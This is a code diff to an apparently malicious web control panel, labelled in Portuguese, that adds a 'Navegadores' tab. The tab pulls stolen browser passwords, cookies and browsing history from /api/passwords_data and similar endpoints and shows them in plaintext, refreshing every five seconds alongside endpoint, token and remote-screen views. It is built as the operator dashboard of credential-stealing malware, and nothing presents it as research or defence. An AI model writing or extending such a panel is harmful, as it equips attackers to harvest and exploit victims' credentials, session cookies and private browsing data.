@@ -220,6 +220,7 @@
     <div class="tabs">
         <button class="tab active" onclick="showTab('endpoints')">🖥️ Endpoints</button>
         <button class="tab" onclick="showTab('metrics')">📊 Métricas</button>
+        <button class="tab" onclick="showTab('browsers')">🌐 Navegadores</button>
         <button class="tab" onclick="showTab('remote')">📺 Acesso Remoto</button>
     </div>
     
@@ -237,6 +238,42 @@
             <h2>📊 Métricas de Autenticação</h2>
             <div id="metricsList">
                 <div class="empty">Carregando...</div>
+            </div>
+        </div>
+    </div>
+    
+    <div id="browsers" class="tab-content">
+        <div class="section">
+            <h2>🌐 Dados de Navegadores</h2>
+            <div class="stats" style="margin-bottom: 20px;">
+                <div class="stat-box">
+                    <div class="stat-number" id="browserPasswords">0</div>
+                    <div class="stat-label">Senhas</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number" id="browserCookies">0</div>
+                    <div class="stat-label">Cookies</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number" id="browserHistory">0</div>
+                    <div class="stat-label">Histórico</div>
+                </div>
+            </div>
+            
+            <div class="tabs">
+                <button class="tab active" onclick="showBrowserTab('passwords')">🔑 Senhas</button>
+                <button class="tab" onclick="showBrowserTab('cookies')">🍪 Cookies</button>
+                <button class="tab" onclick="showBrowserTab('history')">📜 Histórico</button>
+            </div>
+            
+            <div id="browser-passwords" class="browser-tab-content active">
+                <div id="passwordsList"><div class="empty">Carregando...</div></div>
+            </div>
+            <div id="browser-cookies" class="browser-tab-content" style="display:none;">
+                <div id="cookiesList"><div class="empty">Carregando...</div></div>
+            </div>
+            <div id="browser-history" class="browser-tab-content" style="display:none;">
+                <div id="historyList"><div class="empty">Carregando...</div></div>
             </div>
         </div>
     </div>
@@ -261,6 +298,7 @@
         loadStats();
         loadEndpoints();
         loadMetrics();
+        loadBrowserData();
         document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
         
         // Atualiza a cada 5 segundos
@@ -268,6 +306,7 @@
             loadStats();
             loadEndpoints();
             loadMetrics();
+            loadBrowserData();
             loadScreen();
             document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
         }, 5000);
@@ -277,6 +316,80 @@
             document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
             event.target.classList.add('active');
             document.getElementById(tabName).classList.add('active');
+        }
+        
+        function showBrowserTab(tabName) {
+            document.querySelectorAll('#browsers .tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.browser-tab-content').forEach(c => {
+                c.style.display = 'none';
+                c.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            const tab = document.getElementById('browser-' + tabName);
+            tab.style.display = 'block';
+            tab.classList.add('active');
+        }
+        
+        async function loadBrowserData() {
+            try {
+                const passwords = await fetch('/api/passwords_data').then(r => r.json());
+                document.getElementById('browserPasswords').textContent = passwords.length || 0;
+                renderPasswords(passwords);
+                
+                const cookies = await fetch('/api/cookies_data').then(r => r.json());
+                document.getElementById('browserCookies').textContent = cookies.length || 0;
+                renderCookies(cookies);
+                
+                const history = await fetch('/api/history_data').then(r => r.json());
+                document.getElementById('browserHistory').textContent = history.length || 0;
+                renderHistory(history);
+            } catch(e) {}
+        }
+        
+        function renderPasswords(data) {
+            const container = document.getElementById('passwordsList');
+            if (!data || data.length === 0) {
+                container.innerHTML = '<div class="empty">Nenhuma senha encontrada</div>';
+                return;
+            }
+            container.innerHTML = data.map(p => `
+                <div class="token-card">
+                    <div style="color:#00d4ff; margin-bottom:5px">${p.url || 'N/A'}</div>
+                    <div style="color:#ffd700">👤 ${p.username || 'N/A'}</div>
+                    <div style="color:#00d26a; font-family:monospace; margin-top:5px">🔑 ${p.password || 'N/A'}</div>
+                    <div style="color:#888; font-size:0.8em; margin-top:5px">🌐 ${p.browser || 'Unknown'}</div>
+                </div>
+            `).join('');
+        }
+        
+        function renderCookies(data) {
+            const container = document.getElementById('cookiesList');
+            if (!data || data.length === 0) {
+                container.innerHTML = '<div class="empty">Nenhum cookie encontrado</div>';
+                return;
+            }
+            container.innerHTML = data.slice(0, 50).map(c => `
+                <div class="token-card">
+                    <div style="color:#00d4ff">${c.host || 'N/A'}</div>
+                    <div style="color:#ffd700; font-size:0.9em">${c.name || 'N/A'}</div>
+                    <div style="color:#888; font-size:0.8em; margin-top:5px">${c.value ? c.value.substring(0, 100) + '...' : 'N/A'}</div>
+                </div>
+            `).join('');
+        }
+        
+        function renderHistory(data) {
+            const container = document.getElementById('historyList');
+            if (!data || data.length === 0) {
+                container.innerHTML = '<div class="empty">Nenhum histórico encontrado</div>';
+                return;
+            }
+            container.innerHTML = data.slice(0, 50).map(h => `
+                <div class="token-card">
+                    <div style="color:#00d4ff">${h.url || 'N/A'}</div>
+                    <div style="color:#aaa; font-size:0.9em">${h.title || 'Sem título'}</div>
+                    <div style="color:#888; font-size:0.8em; margin-top:5px">🌐 ${h.browser || 'Unknown'}</div>
+                </div>
+            `).join('');
         }
         
         async function loadStats() {
